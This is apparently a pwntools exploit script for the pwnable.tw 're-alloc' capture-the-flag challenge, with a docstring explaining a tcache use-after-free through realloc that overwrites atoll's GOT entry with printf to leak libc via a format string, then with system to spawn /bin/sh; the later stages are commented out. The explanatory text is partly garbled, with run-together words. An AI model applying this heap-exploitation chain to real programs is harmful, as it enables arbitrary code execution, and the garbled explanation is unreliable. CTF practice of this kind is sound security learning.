#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('re-alloc')
libc = ELF('libc.so')
# context.log_level = "debug"
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('chall.pwnable.tw', 10106)  

def alloc(index, size, data):
    io.sendlineafter(b':', b'1')
    io.sendlineafter(b':', index)
    io.sendlineafter(b':', size)
    if(int(size)!=0):
        io.sendafter(b':', data)

def realloc(index, size, data):
    io.sendlineafter(b':', b'2')
    io.sendlineafter(b':', index)
    io.sendlineafter(b':', size)
    io.sendafter(b':', data)

def free(index):
    io.sendlineafter(b':', b'3')
    io.sendlineafter(b':', index)
'''
Partial RELRO -> got table can be changed to overwrite 
function and get a shell
alloc - allocates chunk up to 120 bytes and then adds null byte to the end
realloc(ptr) - code in binary doesn't end it with a null byte
    ptr == 0: malloc(size)
    ptr != 0 && size == 0: free(ptr)
    ptr != 0 && size == old_size: edit(ptr)
    ptr != 0 && size < old_size: edit(ptr) and free(remainder)
    ptr != 0 && size > old_size: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr;
Use uaf to place a atoll_gotchunk in a linked list of different sizes in tcache
Use one atoll_gotof the chunks pointed to to change atoll_gotto printf_plt, so that when calling atoll, 
it will be called printf to construct a format string vulnerability, using this vulnerability can leak the 
libc address on the stack, here choose leak __libc_start_main.
With another point atoll_gotof the chunk will atoll_gotagain change system, because the note atollis printf, 
so invoking alloc, Index Size and need not directly enter the digital input, but by the length of the input string
to a value returned by the indirect transfer printf Give Index and Size.
Since the length of read is limited to 16, note that the relevant chunk of tcache must be here size=0x20, 
otherwise it cannot be used.(You can use "%xc" to control the return value of printf.)
Finally, enter the /bin/sh\x00call atollto execute system("/bin/sh");
'''
#######################
io = start()
atoll_got = elf.got['atoll']
atoll_plt = elf.plt['atoll'] 
printf_plt = elf.plt[ 'printf'] 
libc_start_main_ret_offset = libc.symbols['__libc_start_main'] + 235
system_offset = libc.symbols['system']
# let tcache[32] => atoll_got 
# heap[0] ==> chunk(0x18) <== heap[1]
alloc(b'0', b'24', b'AAA') 
realloc(b'0', b'0', b'')
realloc(b'0', b'24', p64(atoll_got))
# alloc(b'1', b'24', b'BBB')
# # now heap[0] == heap[1] == NULL
# realloc(b'0', b'56', b'CCC') 
# free(b'0') 
# realloc(b'1', b'56', b'D'*16)
# free(b'1')
# let tcache[0x50] => atoll_got 
# heap[0] ==> chunk(0x18) <== heap[1]
# alloc(0 , 0x48 , "AAA") 
# realloc(0 , 0 , '\n') 
# realloc(0, 0x48 , p64(atoll_got)) 
# alloc(1, 0x48, "BBB")
# # now heap[0] == heap[1] == NULL
# realloc( 0 , 0x58 , "CCC") 
# free( 0 ) 
# realloc( 1 , 0x58 , "D" * 0x10 ) 
# free( 1 )
# # above all, we get two tcache point to atoll_got that can be malloc
# # alloc once at heap[0] 
# # change the atoll_got to printf_plt 
# # use format string bug to leak the __libc_start_main_ret in the stack
# alloc(0 , 0x48 , p64(printf_plt)) 
# io.sendlineafter(b"Your choice: " , b"3") 
# io.sendlineafter(b"Index:" , b"%21$llx" )
# libc_start_main_ret = int(io.recv(12), 16 ) 
# libc_base = libc_start_main_ret-libc_start_main_ret_offset 
# libc_system = libc_base + system_offset
# # alloc twice at heap[1] 
# # since the atoll has been set to printf 
# # the return value of printf(which may be the length of the string) will be regarded as the "Index" 
# # thus we use length of the string to make "atoll" work 
# # then we change the atoll_got to libc_system
# io.sendlineafter(b"Your choice: " , b"1" )
# io.sendlineafter(b"Index:" , b"A\x00" )
# io.sendafter(b"Size:" , b"A" * 15 + b"\x00" ) 
# io.sendafter(b"Data:" , p64(libc_system))
# # input "/bin/sh\x00" and call system(atoll) to get shell
# io.sendlineafter(b"Your choice: " , b"3" ) 
# io.sendlineafter(b"Index:" , b"/bin/sh\x00" )
# log.info("libc_start_main_ret: " + hex(libc_start_main_ret)) 
# log.info("libc_base:" + hex(libc_base)) 
# log.info("libc_system: " + hex(libc_system))
io.interactive()
#######################
